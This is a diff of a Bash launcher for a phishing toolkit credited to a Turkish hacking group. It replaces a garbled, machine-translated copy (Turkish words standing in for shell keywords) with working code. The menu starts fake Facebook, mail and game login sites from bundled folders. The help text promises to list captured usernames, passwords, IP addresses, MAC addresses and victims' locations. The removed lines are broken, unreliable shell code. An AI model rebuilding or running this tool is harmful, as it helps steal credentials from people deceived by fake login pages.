@@ -1,59 +1,59 @@
-#!/ bin / bas bash
-#!/ bin/sh
-#Kod:Yaman Efkar
+#!/bin/bash
+#!/bin/sh
+#Code:Yaman Efkar
 #Türk Siber Timi
-#İnstagram : @ turksibertimi
+#İnstagram : @turksibertimi
 #Youtube : YamanEfkar
-açık
-durumda $1 içinde
+clear
+case $1 in
 
       "--help")
- uyku 1
-       echo-e"
+ sleep 1
+       echo -e "
 --help & --h (Yardım Menüsünü Çağırır)
---ıp & --ip (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user (Giriş Yapılmış Username & Pass)
---mac (Giriş Yapanların Mac Adresleri)
---location (Belirtilen Ip Adresinin Yer Tespiti)
+--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
+--user         (Giriş Yapılmış Username & Pass)
+--mac          (Giriş Yapanların Mac Adresleri)
+--location     (Belirtilen Ip Adresinin Yer Tespiti)
 bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
    "
   ;;
 
      "--h")
- uyku 1
-       echo-e"
---help & --h (Yardım Menüsünü Çağırır)
---ıp & --ip (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user (Giriş Yapılmış Username & Pass)
---mac (Giriş Yapanların Mac Adresleri)
---location (Belirtilen Ip Adresinin Yer Tespiti)
+	   sleep 1
+       echo -e "
+--help & --h   (Yardım Menüsünü Çağırır)
+--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
+--user         (Giriş Yapılmış Username & Pass)
+--mac          (Giriş Yapanların Mac Adresleri)
+--location     (Belirtilen Ip Adresinin Yer Tespiti)
 bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
 
   ;;
 
 esac
 
-afiş(){
-echo-e '\033[31; 40; 1m 
- ────────────────█████████───────────────
- ──────────────█████████████─────────────
- ───────────███████████████████──────────
- ────────────────────────────────────────
- ────────████████████████████████────────
- ────────████████████████████████────────
- ────────────────────────────────────────
- █████████─████████████████████─█████████
- █████████─████████████████████─█████████
- ███───────████████────████████───────███
- ███───────██████───██───██████───────███
- ─███──────█████──████────█████──────███─
- ──███─────████─────██─────████─────███──
- ───███────████─────██─────████────███───
- ────███───█████────██────█████───███────
- ─────███──█████────██────█████──███─────
- ──────███─███████──────███████─███──────
- ───────██─████████████████████─██───────
- ────────█─████████████████████─█────────
+banner(){
+echo -e '\033[31;40;1m 
+	────────────────█████████───────────────
+	──────────────█████████████─────────────
+	───────────███████████████████──────────
+	────────────────────────────────────────
+	────────████████████████████████────────
+	────────████████████████████████────────
+	────────────────────────────────────────
+	█████████─████████████████████─█████████
+	█████████─████████████████████─█████████
+	███───────████████────████████───────███
+	███───────██████───██───██████───────███
+	─███──────█████──████────█████──────███─
+	──███─────████─────██─────████─────███──
+	───███────████─────██─────████────███───
+	────███───█████────██────█████───███────
+	─────███──█████────██────█████──███─────
+	──────███─███████──────███████─███──────
+	───────██─████████████████████─██───────
+	────────█─████████████████████─█────────
 	────────────────────────────────────────
 	──────────████████████████████──────────
 	───────────██████████████████───────────
@@ -100,30 +100,30 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 elif [[ $islem == 4 || $islem == 04 ]]; then
 	sleep 1
 	clear
-	cd sitesi / Facebook/
- bash start.sh
+	cd  Site/Facebook/
+	bash start.sh
 
-elif [[$islem = = 5 / / $islem = = 05 ]]; sonra
- uyku 1
- açık
-	cd sitesi / posta/
- bash start.sh
+elif [[ $islem == 5 || $islem == 05 ]]; then
+	sleep 1
+	clear
+	cd  Site/Mail/
+	bash start.sh
 
-elif [[$islem = = 6 / / $islem = = 06]]; sonra
- uyku 1
- açık
-	cd sitesi / oyun/
- bash start.sh
-elif [[$islem == 00]]; sonra
+elif [[ $islem == 6 || $islem == 06 ]]; then
+	sleep 1
+	clear
+	cd  Site/Game/
+	bash start.sh
+elif [[ $islem == 00 ]]; then
 
-	cd sitesi/
- bash code.sh
+	cd Site/
+	bash code.sh
 
-elif [[$islem = = 99 ]]; sonra
-	çıkış 1
-başka
+elif [[ $islem == 99 ]]; then
+	exit 1
+else
 	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
- uyku 1
- açık 
- afiş
+	sleep 1
+	clear 
+	banner
 fi
